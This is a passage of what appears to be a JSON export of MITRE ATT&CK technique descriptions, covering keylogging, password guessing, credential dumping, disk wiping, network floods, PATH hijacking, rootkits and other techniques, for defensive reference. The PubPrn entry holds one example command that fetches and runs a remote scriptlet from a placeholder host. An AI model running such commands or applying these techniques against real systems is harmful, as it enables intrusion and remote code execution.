Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1056.001":{"id":"T1056.001","name":"Keylogging","description":"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.^[[1]](https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html)^\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.^[[2]](http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf)^ Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.^[[3]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^ ","platforms":["Windows","macOS","Linux","Network"],"tactics":["Collection","Credential Access"],"campaigns":["Operation Wocao","2015 Ukraine Electric Power Attack"],"groups":["Magic Hound","APT39","APT38","Ajax Security Team","APT28","Darkhotel","menuPass","Tonto Team","Threat Group-3390","Lazarus Group","Group5","PLATINUM","FIN4","Sandworm Team","Kimsuky","OilRig","Sowbug","HEXANE","APT32","APT3","FIN13","Ke3chang","APT41","Stolen Pencil","Operation Wocao"]},"T1222.002":{"id":"T1222.002","name":"Linux and Mac File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.^[[1]](https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100)^^[[2]](https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110)^ File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: `chown` (short for change owner), and `chmod` (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).^[[3]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^ ","platforms":["macOS","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["TeamTNT","Rocke","APT32"]},"T1110.001":{"id":"T1110.001","name":"Password Guessing","description":"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. ^[[1]](https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf)^\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.^[[2]](https://www.us-cert.gov/ncas/alerts/TA18-086A)^. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.^[[3]](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi)^\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers","Network"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT28","APT29"]},"T1216.001":{"id":"T1216.001","name":"PubPrn","description":"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via `Cscript.exe`. For example, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`.^[[1]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)^\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.^[[2]](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)^ To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT32"]},"T1597.002":{"id":"T1597.002","name":"Purchase Technical Data","description":"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.^[[1]](https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/)^ Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["LAPSUS$"]},"T1003":{"id":"T1003","name":"OS Credential Dumping","description":"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n","platforms":["Windows","Linux","macOS"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT39","Poseidon Group","Tonto Team","APT32","Suckfly","APT28","Sowbug","Axiom","Leviathan","Frankenstein","APT34","Dragonfly"]},"T1129":{"id":"T1129","name":"Shared Modules","description":"Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.^[[1]](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html)^^[[2]](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)^^[[3]](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)^^[[4]](https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/)^\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.^[[5]](https://learn.microsoft.com/troubleshoot/windows-client/deployment/dynamic-link-library)^","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1602":{"id":"T1602","name":"Data from Configuration Repository","description":"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[2]](https://us-cert.cisa.gov/ncas/alerts/TA17-156A)^","platforms":["Network"],"tactics":["Collection"],"campaigns":[],"groups":[]},"T1561.002":{"id":"T1561.002","name":"Disk Structure Wipe","description":"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.^[[1]](https://www.symantec.com/connect/blogs/shamoon-attacks)^^[[2]](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)^^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^^[[5]](https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/)^ The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.^[[6]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/F_through_K.html#wp2829794668)^\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).^[[1]](https://www.symantec.com/connect/blogs/shamoon-attacks)^^[[2]](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)^^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Impact"],"campaigns":[],"groups":["APT38","Sandworm Team","Lazarus Group","APT37"]},"T1498.001":{"id":"T1498.001","name":"Direct Network Flood","description":"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.^[[1]](https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1574.007":{"id":"T1574.007","name":"Path Interception by PATH Environment Variable","description":"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).^[[1]](https://www.expressvpn.com/blog/cybersecurity-lessons-a-path-vulnerability-in-windows/)^\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.^[[2]](https://www.uptycs.com/blog/new-poc-exploit-backdoor-malware)^^[[3]](https://www.cyberciti.biz/faq/appleosx-bash-unix-change-set-path-environment-variable/)^^[[4]](https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-7-16-4-modification-of-environment-variable-via-launchctl.html)^","platforms":["Windows","macOS","Linux"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1213.002":{"id":"T1213.002","name":"Sharepoint","description":"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n","platforms":["Windows","Office 365"],"tactics":["Collection"],"campaigns":["C0027"],"groups":["LAPSUS$","Chimera","APT28","Ke3chang"]},"T1006":{"id":"T1006","name":"Direct Volume Access","description":"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. ^[[1]](http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin)^\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.^[[2]](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)^ Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.^[[3]](https://lolbas-project.github.io/lolbas/Binaries/Esentutl/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1564.008":{"id":"T1564.008","name":"Email Hiding Rules","description":"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the `New-InboxRule` or `Set-InboxRule` [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.^[[1]](https://support.microsoft.com/en-us/office/manage-email-messages-by-using-rules-c24f5dea-9465-4df4-ad17-a50704d66c59)^^[[2]](https://support.apple.com/guide/mail/use-rules-to-manage-emails-you-receive-mlhlp1017/mac)^^[[3]](https://docs.microsoft.com/en-us/powershell/module/exchange/new-inboxrule?view=exchange-ps)^^[[4]](https://docs.microsoft.com/en-us/powershell/module/exchange/set-inboxrule?view=exchange-ps)^\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as `malware`, `suspicious`, `phish`, and `hack`) found in message bodies and subject lines. ^[[5]](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/rule-your-inbox-with-microsoft-cloud-app-security/ba-p/299154)^\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.^[[6]](https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules)^ Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).","platforms":["Windows","Office 365","Linux","macOS","Google Workspace"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["FIN4"]},"T1491.002":{"id":"T1491.002","name":"External Defacement","description":"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.^[[1]](https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf)^^[[2]](https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf)^^[[3]](https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/)^ [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).^[[4]](https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf)^","platforms":["Windows","IaaS","Linux","macOS"],"tactics":["Impact"],"campaigns":[],"groups":["Sandworm Team"]},"T1590.005":{"id":"T1590.005","name":"IP Addresses","description":"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).^[[1]](https://www.whois.net/)^^[[2]](https://dnsdumpster.com/)^^[[3]](https://www.circl.lu/services/passive-dns/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Andariel","Magic Hound","HAFNIUM"]},"T1499.001":{"id":"T1499.001","name":"OS Exhaustion Flood","description":"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.^[[1]](https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf)^ With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.^[[2]](https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/)^\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.^[[3]](https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html)^","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1014":{"id":"T1014","name":"Rootkit","description":"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. ^[[1]](https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf)^ \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). ^[[2]](https://en.wikipedia.org/wiki/Rootkit)^ Rootkits have been seen for Windows, Linux, and Mac OS X systems. ^[[3]](https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/)^ ^[[4]](http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Winnti Group","APT41","Rocke","TeamTNT","APT28"]},"T1546.013":{"id":"T1546.013","name":"PowerShell Profile","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (`profile.ps1`) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. ^[[1]](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6)^ \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the `-NoProfile` flag is used when it is launched. ^[[2]](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/)^ \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. ^[[3]](https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["Turla"]},"T1059.007":{"id":"T1059.007","name":"JavaScript","description":"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.^[[1]](https://nodejs.org/)^\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.^[[2]](https://docs.microsoft.com/windows/win32/com/translating-to-jscript)^^[[3]](https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript)^^[[4]](https://docs.microsoft.com/scripting/winscript/windows-script-interfaces)^\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility `osascript`, they can be compiled into applications or script files via `osacompile`, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.^[[5]](https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html)^^[[6]](https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5)^^[[7]](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)^^[[8]](https://redcanary.com/blog/clipping-silver-sparrows-wings/)^^[[9]](https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/)^\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":["C0017","Operation Dust Storm","C0015"],"groups":["Turla","APT32","FIN6","Sidewinder","MoustachedBouncer","MuddyWater","Earth Lusca","Silence","LazyScripter","TA505","FIN7","Cobalt Group","Higaisa","Kimsuky","Ember Bear","Indrik Spider","Molerats","Leafminer","Evilnum"]},"T1590.002":{"id":"T1590.002","name":"DNS","description":"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.^[[1]](https://twitter.com/PyroTek3/status/1126487227712921600/photo/1)^\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).^[[2]](https://dnsdumpster.com/)^^[[3]](https://www.circl.lu/services/passive-dns/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1123":{"id":"T1123","name":"Audio Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":[],"groups":["APT37"]},"T1543":{"id":"T1543","name":"Create or Modify System Process","description":"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.^[[1]](https://technet.microsoft.com/en-us/library/cc772408.aspx)^ On macOS, launchd processes known as [Launch 